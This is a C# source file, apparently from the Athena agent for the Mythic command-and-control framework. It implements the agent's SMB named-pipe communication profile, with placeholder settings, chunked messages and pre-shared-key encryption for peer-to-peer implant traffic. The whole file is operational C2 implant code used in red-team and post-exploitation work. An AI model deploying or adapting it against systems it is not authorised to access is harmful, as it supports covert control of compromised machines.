using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Linq;
using System.Collections.Concurrent;
using System.Threading.Tasks;
using H.Pipes;
using H.Pipes.Args;
using System.Threading;
using System.Collections.Generic;
using Athena.Models;
using Athena.Models.Config;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
            this.sleep = sleep;
            int jitter = 0;
            this.jitter = jitter;
            this.profile = new Smb();
        }
    }

    public class Smb : IProfile
    {
        public string psk { get; set; }
        private PipeServer<DelegateMessage> serverPipe { get; set; }
        public string pipeName = "pipename";
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
        public PSKCrypto crypt { get; set; }
        public BlockingCollection<DelegateMessage> queueIn { get; set; }
        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();

        public Smb()
        {
            this.connected = false;
            this.psk = "AESPSK";
            this.queueIn = new BlockingCollection<DelegateMessage>();
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
            this.serverPipe.StartAsync();
        }

        private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
        {
            try
            {
                //Add message to out queue.
                if (this.partialMessages.ContainsKey(args.Message.uuid))
                {
                    if (args.Message.final)
                    {
                        string curMessage = args.Message.message;

                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
                        this.queueIn.Add(args.Message);

                        this.partialMessages.Remove(args.Message.uuid, out _);
                        onEventHappenedSignal.Set(); //Indicate something happened
                    }
                    else //Not Last Message but we already have a value in the partial messages
                    {
                        this.partialMessages[args.Message.uuid] += args.Message.message;
                    }
                }
                else //First time we've seen this message
                {
                    if (args.Message.final)
                    {
                        this.queueIn.Add(args.Message);
                        onEventHappenedSignal.Set(); //Indicate something happened
                    }
                    else
                    {
                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
                    }
                }
            }
            catch (Exception e)
            {
            }
        }

        public async Task OnClientConnection()
        {
            onClientConnectedSignal.Set();
            this.connected = true;
        }

        public async Task OnClientDisconnect()
        {
            this.connected = false;
            onEventHappenedSignal.Set(); //Indicate something happened
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }

        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(object obj)
        {
            if (!connected)
            {
                onClientConnectedSignal.WaitOne();
            }

            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(Config.uuid + json);
                }

                DelegateMessage dm;

                IEnumerable<string> parts = json.SplitByLength(50000);

                foreach (string part in parts)
                {
                    if (part == parts.Last())
                    {
                        dm = new DelegateMessage()
                        {
                            uuid = Config.uuid,
                            message = part,
                            c2_profile = "smb",
                            final = true
                        };
                    }
                    else
                    {
                        dm = new DelegateMessage()
                        {
                            uuid = Config.uuid,
                            message = part,
                            c2_profile = "smb",
                            final = false
                        };
                    }
                    await this.serverPipe.WriteAsync(dm);
                }

                //Wait for a signal
                onEventHappenedSignal.WaitOne();
                if (!connected) //Our event was a client disconnect
                {
                    onEventHappenedSignal.Reset(); //Reset the event and return empty
                    return String.Empty;
                }
                else //Our event was a new message
                {
                    if (this.queueIn.Count > 0) //Check if we actually got a message
                    {
                        dm = this.queueIn.Take(); //Take a value from it

                        onEventHappenedSignal.Reset(); //Reset the event and return


                        if (this.encrypted)
                        {
                            return this.crypt.Decrypt(dm.message);
                        }

                        if (!string.IsNullOrEmpty(json))
                        {
                            return (await Misc.Base64Decode(dm.message)).Substring(36);
                        }

                        return String.Empty;
                    }
                    else
                    {
                        return String.Empty;
                    }
                }
            }
            catch (Exception e)
            {
                this.connected = false;
                return String.Empty;
            }
        }
    }
}
